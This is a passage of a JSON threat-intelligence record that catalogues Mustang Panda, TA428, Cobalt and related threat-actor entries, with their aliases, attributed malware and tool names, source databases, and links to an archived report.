                "Agentemis",
                "Chymine",
                "Cobalt Strike",
                "CobaltStrike",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav",
                "cobeacon",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa90ad17-8852-4732-9dba-72ffb64db493",
            "created_at": "2023-07-11T02:00:10.067957Z",
            "updated_at": "2025-03-27T02:00:03.134199Z",
            "deleted_at": null,
            "main_name": "RedDelta",
            "aliases": [],
            "source_name": "MISPGALAXY:RedDelta",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1691c25f-1aa4-4168-8ce2-7aa8f23246e7",
            "created_at": "2024-06-04T02:03:07.724221Z",
            "updated_at": "2025-03-27T02:05:17.284601Z",
            "deleted_at": null,
            "main_name": "BRONZE PRESIDENT",
            "aliases": [
                "Mustang Panda ",
                "Red Lich ",
                "Temp.Hex ",
                "HoneyMyte "
            ],
            "source_name": "Secureworks:BRONZE PRESIDENT",
            "tools": [
                " Cobalt Strike",
                " ORat",
                " PlugX",
                " RCSession",
                "China Chopper"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9baa7519-772a-4862-b412-6f0463691b89",
            "created_at": "2022-10-25T15:50:23.354429Z",
            "updated_at": "2025-03-27T02:00:55.45162Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Mustang Panda",
                "TA416",
                "RedDelta",
                "BRONZE PRESIDENT"
            ],
            "source_name": "MITRE:Mustang Panda",
            "tools": [
                "Cobalt Strike",
                "RCSession",
                "NBTscan",
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
            "created_at": "2022-10-25T16:07:23.882813Z",
            "updated_at": "2025-03-27T02:02:10.0116Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Bronze President",
                "Camaro Dragon",
                "Earth Preta",
                "HoneyMyte",
                "Mustang Panda",
                "Operation SMUGX",
                "Operation SmugX",
                "PKPLUG",
                "Red Lich",
                "Stately Taurus",
                "TEMP.Hex"
            ],
            "source_name": "ETDA:Mustang Panda",
            "tools": [
                "9002 RAT",
                "AdFind",
                "Agent.dhwf",
                "Agentemis",
                "CHINACHOPPER",
                "China Chopper",
                "Chymine",
                "ClaimLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DCSync",
                "DOPLUGS",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Farseer",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "Hdump",
                "HenBox",
                "HidraQ",
                "Hodur",
                "Homux",
                "HopperTick",
                "Hydraq",
                "Impacket",
                "Kaba",
                "Korplug",
                "LadonGo",
                "MQsTTang",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "NBTscan",
                "NetSess",
                "Netview",
                "Orat",
                "POISONPLUG.SHADOW",
                "PUBLOAD",
                "PVE Find AD Users",
                "PlugX",
                "Poison Ivy",
                "PowerView",
                "QMAGENT",
                "RCSession",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TONEINS",
                "TONESHELL",
                "TVT",
                "TeamViewer",
                "Thoper",
                "TinyNote",
                "WispRider",
                "WmiExec",
                "XShellGhost",
                "Xamtrav",
                "Zupdax",
                "cobeacon",
                "nbtscan",
                "nmap",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041807,
    "ts_creation_date": 1615848037,
    "ts_modification_date": 1615848400,
    "files": {
        "pdf": "https://archive.orkl.eu/e123bc949e114983c6c8e297fcf8be6ed519d9d0.pdf",
        "text": "https://archive.orkl.eu/e123bc949e114983c6c8e297fcf8be6ed519d9d0.txt",
        "img": "https://archive.orkl.eu/e123bc949e114983c6c8e297fcf8be6ed519d9d0.jpg"
    }
}